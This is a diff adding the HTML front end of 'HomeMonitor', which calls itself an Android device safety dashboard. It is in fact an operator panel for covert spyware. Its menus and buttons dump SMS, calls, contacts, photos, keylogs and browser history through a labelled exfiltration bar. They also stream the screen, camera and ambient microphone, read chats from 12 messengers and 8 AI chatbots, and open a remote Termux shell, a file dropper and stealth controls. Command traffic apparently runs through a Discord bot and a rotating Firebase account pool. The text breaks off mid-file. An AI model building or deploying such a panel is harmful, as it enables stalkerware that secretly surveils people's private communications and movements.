@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HomeMonitor — Remote Management Dashboard</title>
+    <!-- Bootstrap 5 CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Custom HomeMonitor Theme CSS -->
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+    <!-- LOGIN MODAL / SCREEN (HIDDEN BY DEFAULT FOR INSTANT LOCAL ACCESS) -->
+    <div id="loginScreen" class="position-fixed top-0 start-0 w-100 h-100 d-none align-items-center justify-content-center z-3" style="background-color: #252E3B;">
+        <div class="card card-homemonitor p-4 shadow-lg border-0" style="max-width: 420px; width: 90%;">
+            <div class="text-center mb-3">
+                <i class="fa-solid fa-shield-halved text-success display-4 mb-2"></i>
+                <h4 class="fw-bold text-homemonitor-primary">HomeMonitor Control Panel</h4>
+                <p class="text-homemonitor-secondary small">Android System Safety & Device Monitoring</p>
+            </div>
+            <form id="loginForm">
+                <div class="mb-3">
+                    <label for="loginEmail" class="form-label extra-small text-uppercase fw-bold text-homemonitor-secondary">Account Email</label>
+                    <input type="email" id="loginEmail" class="form-control border" placeholder="admin@homemonitor.com" required>
+                </div>
+                <div class="mb-3">
+                    <label for="loginPassword" class="form-label extra-small text-uppercase fw-bold text-homemonitor-secondary">Password</label>
+                    <input type="password" id="loginPassword" class="form-control border" placeholder="••••••••" required>
+                </div>
+                <button type="submit" class="btn btn-homemonitor-primary w-100 py-2 fw-bold"><i class="fa-solid fa-right-to-bracket me-2"></i>Sign In to Control Panel</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- MAIN DASHBOARD CONTAINER (VISIBLE BY DEFAULT) -->
+    <div id="dashboardApp" class="d-flex min-vh-100">
+
+        <!-- AREA B: LEFT NAVIGATION SIDEBAR -->
+        <div class="sidebar p-3 d-flex flex-column" style="width: 280px; min-width: 280px;">
+            <div class="d-flex align-items-center gap-2 mb-3 pb-2 border-bottom border-secondary">
+                <i class="fa-solid fa-shield-cat text-success fs-3"></i>
+                <div>
+                    <h6 class="mb-0 fw-bold text-light">HomeMonitor Dashboard</h6>
+                    <small class="text-muted extra-small" id="userRoleBadge">Role: Standard User</small>
+                </div>
+            </div>
+
+            <!-- DEVICE SELECTOR DROPDOWN -->
+            <div class="mb-3">
+                <label for="deviceSelector" class="form-label text-uppercase text-muted extra-small fw-bold mb-1">Monitored Device</label>
+                <select id="deviceSelector" class="form-select bg-dark text-success border-secondary small fw-bold">
+                    <option value="">📱 Discovering Enrolled Devices...</option>
+                </select>
+            </div>
+
+            <!-- CATEGORIZED ACCORDION SIDEBAR -->
+            <div class="nav-accordion overflow-y-auto pe-1" style="max-height: calc(100vh - 210px);">
+
+                <!-- Category 1: Overview & Admin -->
+                <div class="nav-category-header fw-bold text-uppercase mt-2 mb-1">Overview & Admin</div>
+                <div class="nav flex-column gap-1">
+                    <a class="nav-link text-light rounded active" data-route="/dashboard" data-tab="tab-dashboard-overview" id="overviewTabBtn"><i class="fa-solid fa-gauge text-primary me-2"></i>Dashboard Overview</a>
+                    <a class="nav-link text-light rounded" data-route="/keyword_rule" data-tab="tab-master-admin" id="adminTabBtn"><i class="fa-solid fa-crown text-warning me-2"></i>👑 Master Admin Console</a>
+                    <a class="nav-link text-light rounded" data-route="/deviceinfo" data-tab="tab-device-info"><i class="fa-solid fa-mobile-screen-button text-info me-2"></i>Device Information</a>
+                    <a class="nav-link text-light rounded" data-route="/wifi" data-tab="tab-firebase-pool"><i class="fa-solid fa-fire text-danger me-2"></i>Firebase Pool & Failover</a>
+                </div>
+
+                <!-- Category 2: General Features -->
+                <div class="nav-category-header fw-bold text-uppercase mt-3 mb-1">General Features</div>
+                <div class="nav flex-column gap-1">
+                    <a class="nav-link text-light rounded" data-route="/contact" data-tab="tab-contacts"><i class="fa-solid fa-address-book text-warning me-2"></i>Contacts</a>
+                    <a class="nav-link text-light rounded" data-route="/sms_chat" data-tab="tab-sms-messages"><i class="fa-solid fa-comment-sms text-info me-2"></i>Text Messages (SMS)</a>
+                    <a class="nav-link text-light rounded" data-route="/call" data-tab="tab-calls"><i class="fa-solid fa-phone text-success me-2"></i>Calls & Recordings</a>
+                    <a class="nav-link text-light rounded" data-route="/photo" data-tab="tab-photos"><i class="fa-solid fa-images text-primary me-2"></i>Photos Gallery</a>
+                    <a class="nav-link text-light rounded" data-route="/video" data-tab="tab-videos"><i class="fa-solid fa-film text-danger me-2"></i>Videos Library</a>
+                    <a class="nav-link text-light rounded" data-route="/application" data-tab="tab-installed-apps"><i class="fa-solid fa-cubes text-info me-2"></i>Installed Applications</a>
+                </div>
+
+                <!-- Category 3: Location Section -->
+                <div class="nav-category-header fw-bold text-uppercase mt-3 mb-1">Location</div>
+                <div class="nav flex-column gap-1">
+                    <a class="nav-link text-light rounded" data-route="/location" data-tab="tab-gps-locations"><i class="fa-solid fa-location-dot text-danger me-2"></i>GPS Locations</a>
+                    <a class="nav-link text-light rounded" data-route="/geofencing_area" data-tab="tab-geofencing"><i class="fa-solid fa-draw-polygon text-primary me-2"></i>Geofencing Zones</a>
+                </div>
+
+                <!-- Category 4: Live Media & Stream -->
+                <div class="nav-category-header fw-bold text-uppercase mt-3 mb-1">Live Media & WebStream</div>
+                <div class="nav flex-column gap-1">
+                    <a class="nav-link text-light rounded" data-route="/live_screen_streaming" data-tab="tab-webstream"><i class="fa-solid fa-desktop text-success me-2"></i>WebStream Remote Screen</a>
+                    <a class="nav-link text-light rounded" data-route="/screenrecorder_pages" data-tab="tab-screenrecorder"><i class="fa-solid fa-circle-play text-danger me-2"></i>Screenrecorder Clips</a>
+                    <a class="nav-link text-light rounded" data-route="/remote_camera" data-tab="tab-camera-studio"><i class="fa-solid fa-camera text-warning me-2"></i>Camera Studio</a>
+                    <a class="nav-link text-light rounded" data-route="/surroundings_recording" data-tab="tab-ambient-mic"><i class="fa-solid fa-microphone text-info me-2"></i>Ambient Mic Recorder</a>
+                </div>
+
+                <!-- Category 5: Social Networks (12 Apps Nested Sub-Menu) -->
+                <div class="nav-category-header fw-bold text-uppercase mt-3 mb-1">Social Messenger Feeds (12 Apps)</div>
+                <div class="nav flex-column gap-1 ms-2 border-start border-success ps-2">
+                    <a class="nav-link text-light rounded py-1" data-route="/whatsapp_chat" data-tab="tab-social-chat" data-app="whatsapp"><i class="fa-brands fa-whatsapp text-success me-2"></i>WhatsApp</a>
+                    <a class="nav-link text-light rounded py-1" data-route="/facebook_messages_chat" data-tab="tab-social-chat" data-app="facebook"><i class="fa-brands fa-facebook-messenger text-primary me-2"></i>Facebook Messenger</a>
+                    <a class="nav-link text-light rounded py-1" data-route="/instagram_chat" data-tab="tab-social-chat" data-app="instagram"><i class="fa-brands fa-instagram text-danger me-2"></i>Instagram Direct</a>
+                    <a class="nav-link text-light rounded py-1" data-route="/snapchat_chat" data-tab="tab-social-chat" data-app="snapchat"><i class="fa-ghost fa-solid text-warning me-2"></i>Snapchat</a>
+                    <a class="nav-link text-light rounded py-1" data-route="/tinder_chat" data-tab="tab-social-chat" data-app="tinder"><i class="fa-fire fa-solid text-danger me-2"></i>Tinder</a>
+                    <a class="nav-link text-light rounded py-1" data-route="/tiktok_chat" data-tab="tab-social-chat" data-app="tiktok"><i class="fa-tiktok fa-brands text-info me-2"></i>TikTok DMs</a>
+                    <a class="nav-link text-light rounded py-1" data-route="/telegram_chat" data-tab="tab-social-chat" data-app="telegram"><i class="fa-brands fa-telegram text-info me-2"></i>Telegram</a>
+                    <a class="nav-link text-light rounded py-1" data-route="/viber_chat" data-tab="tab-social-chat" data-app="viber"><i class="fa-viber fa-brands text-primary me-2"></i>Viber Messenger</a>
+                    <a class="nav-link text-light rounded py-1" data-route="/discord_chat" data-tab="tab-social-chat" data-app="discord"><i class="fa-discord fa-brands text-primary me-2"></i>Discord DMs</a>
+                    <a class="nav-link text-light rounded py-1" data-route="/line_chat" data-tab="tab-social-chat" data-app="line"><i class="fa-line fa-brands text-success me-2"></i>LINE Chat</a>
+                    <a class="nav-link text-light rounded py-1" data-route="/kik_chat" data-tab="tab-social-chat" data-app="kik"><i class="fa-comments fa-solid text-success me-2"></i>Kik Messenger</a>
+                    <a class="nav-link text-light rounded py-1" data-route="/imessage_chat" data-tab="tab-social-chat" data-app="imessage"><i class="fa-comment fa-solid text-primary me-2"></i>iMessage</a>
+                </div>
+
+                <!-- Category 6: AI Chatbot Stream Models (8 AI Models Nested Sub-Menu) -->
+                <div class="nav-category-header fw-bold text-uppercase mt-3 mb-1">AI Chatbot Streams (8 Models)</div>
+                <div class="nav flex-column gap-1 ms-2 border-start border-warning ps-2">
+                    <a class="nav-link text-light rounded py-1" data-route="/chat_gpt" data-tab="tab-social-chat" data-app="chatgpt"><i class="fa-robot fa-solid text-success me-2"></i>ChatGPT-4o</a>
+                    <a class="nav-link text-light rounded py-1" data-route="/gemini" data-tab="tab-social-chat" data-app="gemini"><i class="fa-brain fa-solid text-primary me-2"></i>Google Gemini 1.5 Pro</a>
+                    <a class="nav-link text-light rounded py-1" data-tab="tab-social-chat" data-app="claude"><i class="fa-sparkles fa-solid text-warning me-2"></i>Claude 3.5 Sonnet</a>
+                    <a class="nav-link text-light rounded py-1" data-tab="tab-social-chat" data-app="copilot"><i class="fa-microchip fa-solid text-info me-2"></i>Microsoft Copilot AI</a>
+                    <a class="nav-link text-light rounded py-1" data-tab="tab-social-chat" data-app="deepseek"><i class="fa-lightbulb fa-solid text-primary me-2"></i>DeepSeek-R1 Stream</a>
+                    <a class="nav-link text-light rounded py-1" data-tab="tab-social-chat" data-app="perplexity"><i class="fa-magnifying-glass fa-solid text-success me-2"></i>Perplexity AI Agent</a>
+                    <a class="nav-link text-light rounded py-1" data-tab="tab-social-chat" data-app="grok"><i class="fa-bolt fa-solid text-light me-2"></i>xAI Grok 2 Stream</a>
+                    <a class="nav-link text-light rounded py-1" data-tab="tab-social-chat" data-app="llama"><i class="fa-layer-group fa-solid text-primary me-2"></i>Meta Llama 3 70B</a>
+                </div>
+
+                <!-- Category 6: Internet Usage & Activity -->
+                <div class="nav-category-header fw-bold text-uppercase mt-3 mb-1">Internet & Activity</div>
+                <!-- Category 7: Internet Usage & Activity -->
+                <div class="nav-category-header fw-bold text-uppercase mt-3 mb-1">Internet & Activity</div>
+                <div class="nav flex-column gap-1">
+                    <a class="nav-link text-light rounded" data-route="/browser_history" data-tab="tab-browser-history"><i class="fa-solid fa-compass text-info me-2"></i>Browser History</a>
+                    <a class="nav-link text-light rounded" data-route="/key_logger_app" data-tab="tab-keylogger"><i class="fa-solid fa-keyboard text-danger me-2"></i>Keystroke Keylogger</a>
+                    <a class="nav-link text-light rounded" data-route="/screenrecorder_pages" data-tab="tab-notifications"><i class="fa-solid fa-bell text-warning me-2"></i>Notification Center</a>
+                </div>
+
+                <!-- Category 8: File Storage & Terminal -->
+                <div class="nav-category-header fw-bold text-uppercase mt-3 mb-1">Terminal & Storage</div>
+                <div class="nav flex-column gap-1">
+                    <a class="nav-link text-light rounded" data-route="/termux" data-tab="tab-termux-shell"><i class="fa-solid fa-terminal text-success me-2"></i>Termux Linux Terminal</a>
+                    <a class="nav-link text-light rounded" data-route="/files" data-tab="tab-file-explorer"><i class="fa-solid fa-folder-open text-warning me-2"></i>File Storage Explorer</a>
+                    <a class="nav-link text-light rounded" data-route="/file_dropper" data-tab="tab-file-dropper"><i class="fa-solid fa-cloud-arrow-up text-success me-2"></i>Remote File Dropper</a>
+                    <a class="nav-link text-light rounded" data-route="/block_app" data-tab="tab-mdm-security"><i class="fa-solid fa-user-shield text-danger me-2"></i>MDM, Shizuku & Stealth</a>
+                </div>
+            </div>
+
+            <div class="mt-auto pt-3 border-top border-secondary">
+                <button id="logoutBtn" class="btn btn-outline-danger btn-sm w-100"><i class="fa-solid fa-power-off me-2"></i>Sign Out</button>
+            </div>
+        </div>
+
+        <!-- MAIN CONTENT CANVAS AREA C -->
+        <div class="flex-grow-1 d-flex flex-column overflow-hidden" style="height: 100vh;">
+
+            <!-- AREA A: TOP HEADER BAR -->
+            <div class="top-header px-4 py-3 d-flex justify-content-between align-items-center">
+                <div class="d-flex align-items-center gap-3">
+                    <div>
+                        <h5 class="mb-0 fw-bold text-homemonitor-primary" id="activeDeviceTitle">📱 Monitored Device: Android System</h5>
+                        <small class="text-homemonitor-secondary" id="activeDeviceMeta">Customer ID: CUST-90184 | Model: Build.MODEL | Android OS 14 (SDK 35)</small>
+                    </div>
+                </div>
+                <div class="d-flex align-items-center gap-3">
+                    <div class="form-check form-switch mb-0 bg-dark px-3 py-1 rounded border border-secondary">
+                        <input class="form-check-input" type="checkbox" id="autoArchiveLocalToggle" checked>
+                        <label class="form-check-label extra-small text-light fw-bold" for="autoArchiveLocalToggle" id="autoArchiveLabel"><i class="fa-solid fa-hard-drive me-1 text-primary"></i>Auto-Archive to Local Storage</label>
+                    </div>
+                    <span class="badge bg-success bg-opacity-10 text-success border border-success px-3 py-2" id="connectionModeBadge"><i class="fa-solid fa-bolt me-1 text-warning"></i>P2P WebRTC Direct ⚡</span>
+                    <span class="badge bg-warning bg-opacity-10 text-warning border border-warning px-3 py-2" id="batteryBadge"><i class="fa-solid fa-battery-three-quarters me-1"></i>Battery: 85%</span>
+                    <button class="btn btn-homemonitor-success btn-sm fw-bold" id="refreshTabBtn"><i class="fa-solid fa-rotate me-1"></i>Sync Now</button>
+                </div>
+            </div>
+
+            <!-- MANUAL ON-DEMAND EXFILTRATION DUMP BAR -->
+            <div class="px-4 py-2 bg-dark text-light border-bottom border-secondary d-flex align-items-center justify-content-between">
+                <small class="fw-bold text-warning"><i class="fa-solid fa-download me-1"></i>Manual On-Demand Data Dump Bar:</small>
+                <div class="d-flex gap-2 flex-wrap">
+                    <button class="btn btn-sm btn-outline-info exec-cmd fw-bold" data-cmd="!sms"><i class="fa-solid fa-comment-sms me-1"></i>Dump SMS</button>
+                    <button class="btn btn-sm btn-outline-warning exec-cmd fw-bold" data-cmd="!notification"><i class="fa-solid fa-bell me-1"></i>Dump Notifications</button>
+                    <button class="btn btn-sm btn-outline-success exec-cmd fw-bold" data-cmd="!calls"><i class="fa-solid fa-phone me-1"></i>Dump Calls</button>
+                    <button class="btn btn-sm btn-outline-primary exec-cmd fw-bold" data-cmd="!contacts"><i class="fa-solid fa-address-book me-1"></i>Dump Contacts</button>
+                    <button class="btn btn-sm btn-outline-danger exec-cmd fw-bold" data-cmd="!keylog"><i class="fa-solid fa-keyboard me-1"></i>Dump Keylogs</button>
+                    <button class="btn btn-sm btn-outline-light exec-cmd fw-bold" data-cmd="!dumpphotos 20"><i class="fa-solid fa-images me-1"></i>Dump Photos</button>
+                    <button class="btn btn-sm btn-outline-secondary exec-cmd fw-bold" data-cmd="!browser_history"><i class="fa-solid fa-compass me-1"></i>Dump History</button>
+                </div>
+            </div>
+
+            <!-- DYNAMIC CONTENT WORKSPACE PANELS -->
+            <div id="tabPanelsContainer" class="p-4 overflow-y-auto flex-grow-1">
+
+                <!-- TAB: DASHBOARD OVERVIEW -->
+                <div class="tab-panel" id="tab-dashboard-overview">
+                    <div class="alert alert-info py-2 px-3 mb-3 small">
+                        <i class="fa-solid fa-circle-info me-2"></i><strong>Dashboard Overview Guideline:</strong> Consolidates account subscription, device technical state, location map, and executive actions into a single overview.
+                    </div>
+                    <div class="row g-4">
+                        <div class="col-md-4">
+                            <div class="card card-homemonitor p-3">
+                                <h6 class="fw-bold text-homemonitor-secondary mb-2"><i class="fa-solid fa-credit-card me-2 text-primary"></i>Subscription Status</h6>
+                                <h5 class="fw-bold text-success mb-1">Pro Monitoring Active</h5>
+                                <p class="text-homemonitor-secondary extra-small mb-1">Product: HomeMonitor System</p>
+                                <p class="text-homemonitor-secondary extra-small mb-0">Expiration: Unlimited (Firebase Spark Plan)</p>
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="card card-homemonitor p-3">
+                                <h6 class="fw-bold text-homemonitor-secondary mb-2"><i class="fa-solid fa-mobile-screen me-2 text-info"></i>Device Statistics</h6>
+                                <p class="mb-1 extra-small"><strong>Name:</strong> <span id="overviewDevName" class="fw-bold">Awaiting device...</span></p>
+                                <p class="mb-1 extra-small"><strong>Battery:</strong> <span id="overviewBattery" class="text-secondary fw-bold">Awaiting pulse...</span></p>
+                                <p class="mb-0 extra-small"><strong>Last Sync:</strong> <span class="text-primary fw-bold" id="lastSyncTime">Awaiting sync...</span></p>
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="card card-homemonitor p-3">
+                                <h6 class="fw-bold text-homemonitor-secondary mb-2"><i class="fa-solid fa-bolt me-2 text-warning"></i>Quick Executive Actions</h6>
+                                <div class="d-flex gap-2 flex-wrap mb-2">
+                                    <button class="btn btn-sm btn-outline-success exec-cmd fw-bold" data-cmd="!status"><i class="fa-solid fa-gauge me-1"></i>Check Status</button>
+                                    <button class="btn btn-sm btn-outline-info exec-cmd fw-bold" data-cmd="!deviceinfo"><i class="fa-solid fa-mobile me-1"></i>Device Specs</button>
+                                    <button class="btn btn-sm btn-outline-warning exec-cmd fw-bold" data-cmd="!camera"><i class="fa-solid fa-camera me-1"></i>Rear Photo</button>
+                                    <button class="btn btn-sm btn-outline-danger exec-cmd fw-bold" data-cmd="!screenshot"><i class="fa-solid fa-desktop me-1"></i>Screenshot</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- LIVE EXECUTIVE TERMINAL CONSOLE -->
+                        <div class="col-12">
+                            <div class="card card-homemonitor p-3">
+                                <h6 class="fw-bold text-homemonitor-primary mb-2"><i class="fa-solid fa-terminal me-2 text-success"></i>Live System Terminal Console</h6>
+                                <div class="log-output-box p-3 font-monospace" style="height: 180px; overflow-y: auto;" id="execLogOutput">
+                                    [System Terminal] System initialized. Select any command button or feature tab to dispatch real-time action...
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-12">
+                            <div class="card card-homemonitor p-3">
+                                <h6 class="fw-bold text-homemonitor-primary mb-3"><i class="fa-solid fa-location-dot me-2 text-danger"></i>Recent GPS Location Overview</h6>
+                                <div class="bg-dark text-light p-4 rounded text-center" style="height: 220px; display: flex; align-items: center; justify-content: center;">
+                                    <div class="bg-black bg-opacity-75 p-3 rounded">
+                                        <h6 class="text-success fw-bold mb-1" id="overviewGpsText"><i class="fa-solid fa-map-pin me-2"></i>Awaiting Real-Time GPS Location...</h6>
+                                        <p class="small mb-0 text-light" id="overviewGpsMeta">GPS telemetry will update automatically upon satellite fix.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB 0: MASTER ADMIN CONSOLE -->
+                <div class="tab-panel d-none" id="tab-master-admin">
+                    <div class="card card-homemonitor p-4 mb-4">
+                        <div class="alert alert-warning py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-crown me-2"></i><strong>👑 Master Admin Guidelines:</strong> Toggle feature switches ON/OFF to grant or revoke specific control capabilities for standard users and monitored devices.
+                        </div>
+                        <h4 class="fw-bold text-warning"><i class="fa-solid fa-crown me-2"></i>Master Admin Console</h4>
+                        <p class="text-homemonitor-secondary small">Manage user registry, inspect all enrolled devices, and toggle dynamic feature permissions.</p>
+
+                        <div class="table-responsive mt-3">
+                            <table class="table table-hover align-middle">
+                                <thead class="table-light">
+                                    <tr>
+                                        <th>Device ID</th>
+                                        <th>Owner Account</th>
+                                        <th>Model / OS</th>
+                                        <th>Feature Permissions Toggle Matrix</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="masterAdminDeviceTable">
+                                    <tr>
+                                        <td colspan="5" class="text-center text-muted">Loading device permissions matrix...</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: DEVICE INFORMATION -->
+                <div class="tab-panel d-none" id="tab-device-info">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-info py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-circle-info me-2"></i><strong>Device Specs Guidelines:</strong> Displays technical hardware attributes, battery health, RAM, storage, and IP address.
+                        </div>
+                        <h4 class="fw-bold text-info mb-3"><i class="fa-solid fa-mobile-screen-button me-2"></i>Technical Device Specs</h4>
+                        <div class="row g-3">
+                            <div class="col-md-6"><div class="p-3 bg-light rounded border"><strong>Model:</strong> <span id="specModel">Android System</span></div></div>
+                            <div class="col-md-6"><div class="p-3 bg-light rounded border"><strong>OS Version:</strong> <span id="specOs">Android 14 (API 35)</span></div></div>
+                            <div class="col-md-6"><div class="p-3 bg-light rounded border"><strong>Battery:</strong> <span id="specBattery" class="text-success fw-bold">85% (Good)</span></div></div>
+                            <div class="col-md-6"><div class="p-3 bg-light rounded border"><strong>Local IP:</strong> <span id="specIp">192.168.1.150</span></div></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: FIREBASE POOL & DISCORD STATUS -->
+                <div class="tab-panel d-none" id="tab-firebase-pool">
+                    <div class="card card-homemonitor p-4 mb-4">
+                        <div class="alert alert-danger py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-fire me-2"></i><strong>Firebase Failover Guidelines:</strong> Shows live quota health and rotation metrics for Primary + 5 Fallback Firebase accounts.
+                        </div>
+                        <h4 class="fw-bold text-danger mb-3"><i class="fa-solid fa-fire me-2"></i>Firebase 6-Account Failover Pool</h4>
+                        <div class="row g-3" id="firebaseAccountCardsContainer">
+                            <div class="col-md-4"><div class="p-3 bg-light rounded border"><h6>Primary Account</h6><p class="small text-success mb-0">Status: ACTIVE 🟢</p></div></div>
+                            <div class="col-md-4"><div class="p-3 bg-light rounded border"><h6>Fallback #1</h6><p class="small text-muted mb-0">Status: READY 🟢</p></div></div>
+                            <div class="col-md-4"><div class="p-3 bg-light rounded border"><h6>Fallback #2</h6><p class="small text-muted mb-0">Status: READY 🟢</p></div></div>
+                        </div>
+                    </div>
+
+                    <!-- Discord Gateway & Channel Matrix Card -->
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-info py-2 px-3 mb-3 small">
+                            <i class="fa-brands fa-discord me-2"></i><strong>Discord Matrix Guidelines:</strong> Monitor live Discord Bot Gateway connection state, Guild Channel Matrix, and Slash Command registrations.
+                        </div>
+                        <h4 class="fw-bold text-primary mb-3"><i class="fa-brands fa-discord me-2"></i>Discord Bot Gateway & Guild Channel Matrix</h4>
+                        <div class="row g-3 mb-3">
+                            <div class="col-md-4"><div class="p-3 bg-light rounded border"><h6>Bot Gateway State</h6><p class="small text-success mb-0 fw-bold" id="dcGatewayState">CONNECTED 🟢 (WebSocket Op 1/2)</p></div></div>
+                            <div class="col-md-4"><div class="p-3 bg-light rounded border"><h6>Guild Matrix Subchannels</h6><p class="small text-primary mb-0 fw-bold" id="dcChannelCount">29 Category Channels Active</p></div></div>
+                            <div class="col-md-4"><div class="p-3 bg-light rounded border"><h6>Slash Command Registry</h6><p class="small text-info mb-0 fw-bold" id="dcCmdCount">32 Commands Registered</p></div></div>
+                        </div>
+                        <div class="d-flex gap-2">
+                            <button class="btn btn-homemonitor-primary btn-sm exec-cmd" data-cmd="!status"><i class="fa-solid fa-rotate me-1"></i>Test Discord Connection</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: CONTACTS PHONEBOOK -->
+                <div class="tab-panel d-none" id="tab-contacts">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-warning py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-address-book me-2"></i><strong>Contacts Guidelines:</strong> View address book contacts and trigger direct call or SMS.
+                        </div>
+                        <h4 class="fw-bold text-warning mb-3"><i class="fa-solid fa-address-book me-2"></i>Contacts Phonebook</h4>
+                        <div class="input-group mb-3">
+                            <input type="text" id="contactSearchInput" class="form-control" placeholder="Search contacts by name or number...">
+                            <button class="btn btn-outline-secondary"><i class="fa-solid fa-search"></i></button>
+                        </div>
+                        <div class="table-responsive">
+                            <table class="table table-hover align-middle">
+                                <thead><tr><th>Name</th><th>Phone Number</th><th>Type</th><th>Actions</th></tr></thead>
+                                <tbody id="contactsTableBody">
+                                    <tr><td>John Doe</td><td>+1 (555) 019-2834</td><td>Mobile</td><td><button class="btn btn-sm btn-outline-success">Call</button> <button class="btn btn-sm btn-outline-info">SMS</button></td></tr>
+                                    <tr><td>Jane Smith</td><td>+1 (555) 012-9981</td><td>Work</td><td><button class="btn btn-sm btn-outline-success">Call</button> <button class="btn btn-sm btn-outline-info">SMS</button></td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: CALL LOGS & RECORDINGS -->
+                <div class="tab-panel d-none" id="tab-calls">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-success py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-phone me-2"></i><strong>Call History Guidelines:</strong> Inspect incoming/outgoing call logs and listen to call recordings.
+                        </div>
+                        <h4 class="fw-bold text-success mb-3"><i class="fa-solid fa-phone-volume me-2"></i>Call History & Audio Recordings</h4>
+                        <div class="table-responsive mb-4">
+                            <table class="table table-hover align-middle">
+                                <thead><tr><th>Contact</th><th>Number</th><th>Type</th><th>Duration</th><th>Timestamp</th></tr></thead>
+                                <tbody>
+                                    <tr><td>John Doe</td><td>+1 (555) 019-2834</td><td><span class="badge bg-success">Incoming</span></td><td>3m 12s</td><td>Today, 10:14 AM</td></tr>
+                                    <tr><td>Unknown</td><td>+1 (555) 088-1122</td><td><span class="badge bg-danger">Missed</span></td><td>0s</td><td>Today, 09:30 AM</td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        <h5 class="fw-bold text-homemonitor-primary mb-2">Recorded Call Audio Clips</h5>
+                        <div class="log-output-box p-3" style="height: 180px; overflow-y: auto;" id="callRecsOutput">
+                            [Call Recs] No recorded call audio clips found.
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: PHOTOS GALLERY -->
+                <div class="tab-panel d-none" id="tab-photos">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-primary py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-images me-2"></i><strong>Photos Gallery Guidelines:</strong> Browse photo gallery, dump by date range, or download media ZIP packages.
+                        </div>
+                        <h4 class="fw-bold text-primary mb-3"><i class="fa-solid fa-images me-2"></i>Device Photo Gallery</h4>
+                        <div class="d-flex gap-2 mb-4">
+                            <button class="btn btn-homemonitor-primary exec-cmd" data-cmd="/syncmedia 24"><i class="fa-solid fa-file-zipper me-1"></i>Download Media ZIP (24h)</button>
+                            <button class="btn btn-outline-primary exec-cmd" data-cmd="/dumpphotos 20"><i class="fa-solid fa-download me-1"></i>Dump Recent Photos</button>
+                        </div>
+                        <div class="row g-3" id="photoGalleryGrid">
+                            <div class="col-md-3"><div class="card bg-dark text-light p-2 text-center"><i class="fa-solid fa-image display-6 my-3 text-secondary"></i><small>IMG_20261117_01.jpg</small></div></div>
+                            <div class="col-md-3"><div class="card bg-dark text-light p-2 text-center"><i class="fa-solid fa-image display-6 my-3 text-secondary"></i><small>IMG_20261117_02.jpg</small></div></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: GPS LOCATIONS -->
+                <div class="tab-panel d-none" id="tab-gps-locations">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-danger py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-location-dot me-2"></i><strong>GPS Locations Guidelines:</strong> View real-time location and historical route coordinates.
+                        </div>
+                        <h4 class="fw-bold text-danger mb-3"><i class="fa-solid fa-map-location-dot me-2"></i>GPS Location Tracking</h4>
+                        <div class="d-flex gap-2 mb-3">
+                            <button class="btn btn-homemonitor-primary exec-cmd" data-cmd="/geolocation"><i class="fa-solid fa-location-crosshairs me-1"></i>Get GPS Location</button>
+                            <button class="btn btn-outline-secondary exec-cmd" data-cmd="/iplocation"><i class="fa-solid fa-globe me-1"></i>Get IP Geolocation</button>
+                        </div>
+                        <div class="table-responsive">
+                            <table class="table table-hover align-middle">
+                                <thead><tr><th>Timestamp</th><th>Latitude / Longitude</th><th>Accuracy</th><th>Address / Place</th></tr></thead>
+                                <tbody>
+                                    <tr><td>Today, 10:30 AM</td><td>27.7172° N, 85.3240° E</td><td>12m</td><td>Central District, Sector 4</td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: GEOFENCING ZONES -->
+                <div class="tab-panel d-none" id="tab-geofencing">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-primary py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-draw-polygon me-2"></i><strong>Geofencing Guidelines:</strong> Set up perimeter boundaries and receive automated entry/exit security alerts.
+                        </div>
+                        <h4 class="fw-bold text-primary mb-3"><i class="fa-solid fa-draw-polygon me-2"></i>Geofence Safe Zones</h4>
+                        <form id="geofenceForm" class="row g-3 mb-4">
+                            <div class="col-md-5"><input type="text" class="form-control" placeholder="Zone Name (e.g. Home, School)" required></div>
+                            <div class="col-md-4"><input type="number" class="form-control" placeholder="Radius (meters, e.g. 500)" required></div>
+                            <div class="col-md-3"><button type="submit" class="btn btn-homemonitor-primary w-100 fw-bold">Add Safe Zone</button></div>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- TAB: WEBSTREAM REMOTE TOUCH SCREEN CONTROL -->
+                <div class="tab-panel d-none" id="tab-webstream">
+                    <div class="card card-homemonitor p-4">
